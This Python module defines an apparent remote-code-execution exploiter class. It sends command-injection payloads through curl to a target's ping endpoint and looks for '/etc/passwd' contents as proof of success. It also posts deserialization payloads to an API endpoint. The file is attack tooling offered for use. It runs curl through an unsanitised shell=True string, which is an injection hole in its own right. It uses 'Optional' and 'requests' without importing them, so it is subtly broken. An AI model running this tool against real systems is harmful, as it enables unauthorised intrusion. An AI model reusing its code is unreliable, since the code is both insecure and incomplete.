import subprocess
import re
from utils.payloads import RCE_PAYLOADS
from utils.logger import ExploitLogger

class RCEExploiter:
    def __init__(self, target: str):
        self.target = target
        self.logger = ExploitLogger("rce")

    def _test_os_command(self) -> Optional[str]:
        """Test command injection (e.g., `; ls`)."""
        for payload in RCE_PAYLOADS["os"]:
            try:
                result = subprocess.run(
                    f"curl -s '{self.target}/ping?ip={payload}'",
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=5
                )
                if "root:" in result.stdout:
                    return f"OS Command Injection: {payload}"
            except subprocess.TimeoutExpired:
                self.logger.warning("Timeout during OS command test")
        return None

    def _test_deserialization(self) -> Optional[str]:
        """Test Python/PHP deserialization."""
        for payload in RCE_PAYLOADS["deserialization"]:
            try:
                response = requests.post(
                    f"{self.target}/api/deserialize",
                    data={"data": payload},
                    timeout=10
                )
                if "RCE_SUCCESS" in response.text:
                    return f"Deserialization RCE: {payload[:50]}..."
            except Exception as e:
                self.logger.error(f"Deserialization failed: {e}")
        return None

    def run(self) -> dict:
        return {
            "os_command": self._test_os_command(),
            "deserialization": self._test_deserialization()
        }
